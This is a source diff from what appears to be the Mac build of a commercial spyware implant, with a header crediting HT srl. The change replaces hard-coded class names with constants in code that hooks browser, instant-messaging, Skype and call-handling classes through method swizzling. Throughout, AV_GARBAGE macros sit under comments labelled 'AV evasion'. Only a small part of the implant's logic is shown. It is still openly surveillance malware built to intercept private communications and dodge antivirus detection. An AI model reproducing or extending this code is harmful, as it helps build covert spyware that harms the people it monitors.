@@ -13,6 +13,7 @@
  * Copyright (C) HT srl 2009. All rights reserved
  *
  */
+#import "RCSMInterface.h"
 
 #import <AudioToolbox/AudioToolbox.h>
 #import <AudioUnit/AudioUnit.h>
@@ -728,7 +729,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       // AV evasion: only on release build
       AV_GARBAGE_001 
 
-      Class classSource = objc_getClass("myBrowserWindowController");
+      Class classSource = objc_getClass(kMyBrowserWindowController);
       
       // AV evasion: only on release build
       AV_GARBAGE_002 
@@ -1275,7 +1276,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         // AV evasion: only on release build
         AV_GARBAGE_003 
 
-        classSource = objc_getClass("myIMWebViewController");
+        classSource = objc_getClass(kMyIMWebViewController);
         
         // AV evasion: only on release build
         AV_GARBAGE_005 
@@ -1292,7 +1293,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         // AV evasion: only on release build
         AV_GARBAGE_002 
 
-        classSource = objc_getClass("myIMWindowController");
+        classSource = objc_getClass(kMyIMWindowController);
         
         // AV evasion: only on release build
         AV_GARBAGE_003 
@@ -1317,7 +1318,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         // AV evasion: only on release build
         AV_GARBAGE_009 
 
-        Class classSource = objc_getClass("mySkypeChat");
+        Class classSource = objc_getClass(kMySkypeChat);
         
         // AV evasion: only on release build
         AV_GARBAGE_003 
@@ -1342,7 +1343,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         // AV evasion: only on release build
         AV_GARBAGE_003 
 
-        Class classSource = objc_getClass("myAIContentController");
+        Class classSource = objc_getClass(kMyAIContentController);
         
         // AV evasion: only on release build
         AV_GARBAGE_003 
@@ -1474,7 +1475,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       // AV evasion: only on release build
       AV_GARBAGE_001
 
-      Class classSource = objc_getClass("myMacCallX");
+      Class classSource = objc_getClass(kMyMacCallX);
       
       // AV evasion: only on release build
       AV_GARBAGE_002 
@@ -1581,7 +1582,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         // AV evasion: only on release build
         AV_GARBAGE_008
 
-        Class c2 = objc_getClass("myEventController");
+        Class c2 = objc_getClass(kMyEventController);
         
         // AV evasion: only on release build
         AV_GARBAGE_007 
@@ -1672,7 +1673,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       // AV evasion: only on release build
       AV_GARBAGE_004 
 
-      Class classSource = objc_getClass("myMacCallX");
+      Class classSource = objc_getClass(kMyMacCallX);
       
       // AV evasion: only on release build
       AV_GARBAGE_005 
@@ -1716,7 +1717,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
         // AV evasion: only on release build
         AV_GARBAGE_008 
 
-        Class c2 = objc_getClass("myEventController");
+        Class c2 = objc_getClass(kMyEventController);
         
         // AV evasion: only on release build
         AV_GARBAGE_003 
@@ -1750,7 +1751,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       // AV evasion: only on release build
       AV_GARBAGE_001 
 
-      Class classSource = objc_getClass("myNSDocumentController");
+      Class classSource = objc_getClass(kMyNSDocumentController);
       
       // AV evasion: only on release build
       AV_GARBAGE_003 
@@ -1786,7 +1787,7 @@ BOOL swizzleByAddingIMP (Class _class, SEL _original, IMP _newImplementation, SE
       // AV evasion: only on release build
       AV_GARBAGE_002 
 
-      Class classSource = objc_getClass("myNSDocumentController");
+      Class classSource = objc_getClass(kMyNSDocumentController);
       
       // AV evasion: only on release build
       AV_GARBAGE_003 
@@ -2418,7 +2419,7 @@ if ([mSharedMemoryCommand createMemoryRegion] == -1)
   // AV evasion: only on release build
   AV_GARBAGE_005
 
-  Class classSource = objc_getClass("mySMProcessController");
+  Class classSource = objc_getClass(kMySMProcessController);
   
   // AV evasion: only on release build
   AV_GARBAGE_002
